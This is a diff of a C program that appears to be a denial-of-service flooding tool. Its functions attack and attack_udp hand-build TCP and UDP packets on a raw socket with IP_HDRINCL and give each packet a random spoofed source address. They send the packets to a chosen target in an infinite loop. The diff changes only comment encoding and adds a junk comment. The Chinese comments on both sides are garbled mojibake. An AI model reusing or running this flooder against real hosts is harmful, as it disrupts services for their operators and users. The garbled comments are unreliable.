@@ -14,13 +14,13 @@
 #include <arpa/inet.h>
 #include <linux/tcp.h>
 
-//ÎÒÃÇ×Ô¼ºĞ´µÄ¹¥»÷º¯Êı
+//æˆ‘ä»¬è‡ªå·±å†™çš„æ”»å‡»å‡½æ•°
 void attack(int skfd,struct sockaddr_in *target,unsigned short srcport);
-//Èç¹ûÊ²Ã´¶¼ÈÃÄÚºË×ö£¬ÄÇÆñ²»ÊÇß¯²»Ë¬ÁË£¬ÔÛÒ²ÊÔ×Å¼ÆËãÒ»ÏÂĞ£ÑéºÍ¡£
+//å¦‚æœä»€ä¹ˆéƒ½è®©å†…æ ¸åšï¼Œé‚£å²‚ä¸æ˜¯å¿’ä¸çˆ½äº†ï¼Œå’±ä¹Ÿè¯•ç€è®¡ç®—ä¸€ä¸‹æ ¡éªŒå’Œã€‚
 unsigned short check_sum(unsigned short *addr,int len);
 
 
-
+//A test  asdfasdfasdfasdf
 u_int16_t checksum(void *addr, int count)
 {
 	/* Compute Internet Checksum for "count" bytes
@@ -51,7 +51,7 @@ u_int16_t checksum(void *addr, int count)
 }
 
 
-//ÔÚ¸Ãº¯ÊıÖĞ¹¹ÔìÕû¸öIP±¨ÎÄ£¬×îºóµ÷ÓÃsendtoº¯Êı½«±¨ÎÄ·¢ËÍ³öÈ¥
+//åœ¨è¯¥å‡½æ•°ä¸­æ„é€ æ•´ä¸ªIPæŠ¥æ–‡ï¼Œæœ€åè°ƒç”¨sendtoå‡½æ•°å°†æŠ¥æ–‡å‘é€å‡ºå»
 void attack_udp(int skfd,struct sockaddr_in *target,unsigned short srcport)
 {
         char buf[128]={0};
@@ -61,9 +61,9 @@ void attack_udp(int skfd,struct sockaddr_in *target,unsigned short srcport)
         char *msg = "wxyyyy";
         char *data;
 
-        //ÔÚÎÒÃÇTCPµÄ±¨ÎÄÖĞDataÃ»ÓĞ×Ö¶Î£¬ËùÒÔÕû¸öIP±¨ÎÄµÄ³¤¶È
+        //åœ¨æˆ‘ä»¬TCPçš„æŠ¥æ–‡ä¸­Dataæ²¡æœ‰å­—æ®µï¼Œæ‰€ä»¥æ•´ä¸ªIPæŠ¥æ–‡çš„é•¿åº¦
         ip_len = sizeof(struct ip)+sizeof(struct udphdr) + strlen(msg)+1;
-        //¿ªÊ¼Ìî³äIPÊ×²¿
+        //å¼€å§‹å¡«å……IPé¦–éƒ¨
         ip=(struct ip*)buf;
 
         ip->ip_v = IPVERSION;
@@ -77,7 +77,7 @@ void attack_udp(int skfd,struct sockaddr_in *target,unsigned short srcport)
         ip->ip_sum=0;
         ip->ip_dst=target->sin_addr;
 
-        //¿ªÊ¼Ìî³äTCPÊ×²¿
+        //å¼€å§‹å¡«å……TCPé¦–éƒ¨
         udp = (struct udphdr*)(buf+sizeof(struct ip));
         udp->source = htons(srcport);
         udp->dest = target->sin_port;
@@ -88,7 +88,7 @@ void attack_udp(int skfd,struct sockaddr_in *target,unsigned short srcport)
         memcpy(data, msg, strlen(msg) + 1);
         
         while(1){
-                //Ô´µØÖ·Î±Ôì£¬ÎÒÃÇËæ±ãÈÎÒâÉú³É¸öµØÖ·£¬ÈÃ·şÎñÆ÷Ò»Ö±µÈ´ıÏÂÈ¥
+                //æºåœ°å€ä¼ªé€ ï¼Œæˆ‘ä»¬éšä¾¿ä»»æ„ç”Ÿæˆä¸ªåœ°å€ï¼Œè®©æœåŠ¡å™¨ä¸€ç›´ç­‰å¾…ä¸‹å»
                 ip->ip_src.s_addr = random();
                 udp->check=checksum((unsigned short*)udp,sizeof(struct udphdr)+ strlen(msg)+1);
                 sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
@@ -125,34 +125,34 @@ int main(int argc,char** argv){
                 target.sin_addr=*(struct in_addr *)(host->h_addr_list[0]);
         }
 
-        //½«Ğ­Òé×Ö¶ÎÖÃÎªIPPROTO_TCP£¬À´´´½¨Ò»¸öTCPµÄÔ­Ê¼Ì×½Ó×Ö
+        //å°†åè®®å­—æ®µç½®ä¸ºIPPROTO_TCPï¼Œæ¥åˆ›å»ºä¸€ä¸ªTCPçš„åŸå§‹å¥—æ¥å­—
         if(0>(skfd=socket(AF_INET,SOCK_RAW,IPPROTO_UDP))){
                 perror("Create Error");
                 exit(1);
         }
 
-        //ÓÃÄ£°å´úÂëÀ´¿ªÆôIP_HDRINCLÌØĞÔ£¬ÎÒÃÇÍêÈ«×Ô¼ºÊÖ¶¯¹¹ÔìIP±¨ÎÄ
+        //ç”¨æ¨¡æ¿ä»£ç æ¥å¼€å¯IP_HDRINCLç‰¹æ€§ï¼Œæˆ‘ä»¬å®Œå…¨è‡ªå·±æ‰‹åŠ¨æ„é€ IPæŠ¥æ–‡
          if(0>setsockopt(skfd,IPPROTO_IP,IP_HDRINCL,&on,sizeof(on))){
                 perror("IP_HDRINCL failed");
                 exit(1);
         }
 
-        //ÒòÎªÖ»ÓĞrootÓÃ»§²Å¿ÉÒÔplay with raw socket :)
+        //å› ä¸ºåªæœ‰rootç”¨æˆ·æ‰å¯ä»¥play with raw socket :)
         //setuid(getpid());
         srcport = atoi(argv[3]);
         attack_udp(skfd,&target,srcport);
 }
 
-//ÔÚ¸Ãº¯ÊıÖĞ¹¹ÔìÕû¸öIP±¨ÎÄ£¬×îºóµ÷ÓÃsendtoº¯Êı½«±¨ÎÄ·¢ËÍ³öÈ¥
+//åœ¨è¯¥å‡½æ•°ä¸­æ„é€ æ•´ä¸ªIPæŠ¥æ–‡ï¼Œæœ€åè°ƒç”¨sendtoå‡½æ•°å°†æŠ¥æ–‡å‘é€å‡ºå»
 void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
         char buf[128]={0};
         struct ip *ip;
         struct tcphdr *tcp;
         int ip_len;
 
-        //ÔÚÎÒÃÇTCPµÄ±¨ÎÄÖĞDataÃ»ÓĞ×Ö¶Î£¬ËùÒÔÕû¸öIP±¨ÎÄµÄ³¤¶È
+        //åœ¨æˆ‘ä»¬TCPçš„æŠ¥æ–‡ä¸­Dataæ²¡æœ‰å­—æ®µï¼Œæ‰€ä»¥æ•´ä¸ªIPæŠ¥æ–‡çš„é•¿åº¦
         ip_len = sizeof(struct ip)+sizeof(struct tcphdr);
-        //¿ªÊ¼Ìî³äIPÊ×²¿
+        //å¼€å§‹å¡«å……IPé¦–éƒ¨
         ip=(struct ip*)buf;
 
         ip->ip_v = IPVERSION;
@@ -166,7 +166,7 @@ void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
         ip->ip_sum=0;
         ip->ip_dst=target->sin_addr;
 
-        //¿ªÊ¼Ìî³äTCPÊ×²¿
+        //å¼€å§‹å¡«å……TCPé¦–éƒ¨
         tcp = (struct tcphdr*)(buf+sizeof(struct ip));
         tcp->source = htons(srcport);
         tcp->dest = target->sin_port;
@@ -176,7 +176,7 @@ void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
         tcp->check = 0;
 
         while(1){
-                //Ô´µØÖ·Î±Ôì£¬ÎÒÃÇËæ±ãÈÎÒâÉú³É¸öµØÖ·£¬ÈÃ·şÎñÆ÷Ò»Ö±µÈ´ıÏÂÈ¥
+                //æºåœ°å€ä¼ªé€ ï¼Œæˆ‘ä»¬éšä¾¿ä»»æ„ç”Ÿæˆä¸ªåœ°å€ï¼Œè®©æœåŠ¡å™¨ä¸€ç›´ç­‰å¾…ä¸‹å»
                 ip->ip_src.s_addr = random();
                 tcp->check=check_sum((unsigned short*)tcp,sizeof(struct tcphdr));
                 sendto(skfd,buf,ip_len,0,(struct sockaddr*)target,sizeof(struct sockaddr_in));
@@ -184,7 +184,7 @@ void attack(int skfd,struct sockaddr_in *target,unsigned short srcport){
         }
 }
 
-//¹ØÓÚCRCĞ£ÑéºÍµÄ¼ÆËã£¬ÍøÉÏÒ»´ó¶Ñ£¬ÎÒ¾Í¡°ÄÃÀ´Ö÷Òå¡±ÁË
+//å…³äºCRCæ ¡éªŒå’Œçš„è®¡ç®—ï¼Œç½‘ä¸Šä¸€å¤§å †ï¼Œæˆ‘å°±â€œæ‹¿æ¥ä¸»ä¹‰â€äº†
 unsigned short check_sum(unsigned short *addr,int len){
         register int nleft=len;
         register int sum=0;
